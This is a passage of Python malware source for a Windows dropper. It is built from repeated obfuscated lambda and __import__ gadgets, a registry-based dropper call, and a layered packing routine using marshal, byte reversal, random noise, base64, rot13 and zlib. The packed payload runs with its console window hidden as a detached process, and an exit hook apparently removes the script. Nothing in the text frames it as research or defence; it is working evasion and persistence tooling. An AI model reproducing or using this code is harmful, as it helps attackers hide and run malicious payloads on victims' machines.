     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
if reg_dropper(r"{our_reg_key}", r"{TypicalRegistryKey}", r"{random_location}"):
    boomBoom(r"{random_location}")
    (lambda _, __, ___, ____, _____, ______, _______, ________:
     getattr(
         __import__(0x0021.__class__.__name__[_] + [].__class__.__name__[__]),
         ().__class__.__eq__.__class__.__name__[:__] +
         ().__iter__().__class__.__name__[_____:________]
     ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x011.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00009.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x0008.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x007.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(0x00006.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
(lambda _, __, ___, ____, _____, ______, _______, ________:
 getattr(
     __import__(True.__class__.__name__[_] + [].__class__.__name__[__]),
     ().__class__.__eq__.__class__.__name__[:__] +
     ().__iter__().__class__.__name__[_____:________]
 ))
""".encode()).decode()
            command_to_run = f"""from ctypes import windll;from base64 import b64decode;windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), {hide});exec(b64decode('{our_code}'))"""
            #command_to_run = f"""
            #from base64 import b64decode;exec(b64decode('{our_code}'))
             #           """
            print(f"compiling command_to_run")
            compiled_sub_dropper = compile(command_to_run,'<string>','exec')
            marshal_bytes = dumps(compiled_sub_dropper)
            reversed_bytes = marshal_bytes[::-1]
            urandom_atstart = randrange(128, 512)
            #urandom_atend = randrange(128, 512)
            noise = urandom(urandom_atstart) + reversed_bytes
            bytes_sub_dropper = f"""from marshal import loads;code={noise};decoded_code=exec(loads(code[{urandom_atstart}:][::-1]))"""
            main_dropper_bytes = dumps(compile(bytes_sub_dropper,'<string>','exec')) #bytes
            base64main_dropper = b64encode(main_dropper_bytes).decode() #str
            rot_first13_dropper = encode(base64main_dropper,'rot13') #str
            reversed_main_dropper = rot_first13_dropper[::-1] #str
            rot_13_main_dropper = encode(reversed_main_dropper,'rot13') #str
            compressed_main_dropper = compress(rot_13_main_dropper.encode(),level=9) #bytes
            another_b64_main_dropper = b64encode(compressed_main_dropper).decode()
            another_rot13_main = encode(another_b64_main_dropper,'rot13')
            dropper = (
                 f'from base64 import b64decode;from codecs import encode;from zlib import decompress;from marshal import loads;\n'
                 f'code = """{another_rot13_main}""";\n'
                 f'code = encode(code,\'rot13\');\n'
                 f'code = b64decode(code);\n'
                f'code = decompress(code).decode();\n'
                 f'code = encode(code,\'rot13\');\n'
                 f'code = code[::-1];\n'
                 f'code = encode(code,\'rot13\');\n'
                 f'code = b64decode(code);\n'
                 f'exec(loads(code));\n')
            end_dropper = b64encode(dropper.encode()).decode()
            end_code = f'from ctypes import windll;from base64 import b64decode;windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), {hide});exec(b64decode("""{end_dropper}"""))'
            done = f"from base64 import b64decode;exec(b64decode('{b64encode(end_code.encode()).decode()}'))"
            print(f"""{python_path} -c "{done}"  """)
            ourCommand = run_detached_process(f"""{python_path} -c "{done}"  """)
            return True
atexit.register(remove_on_exit)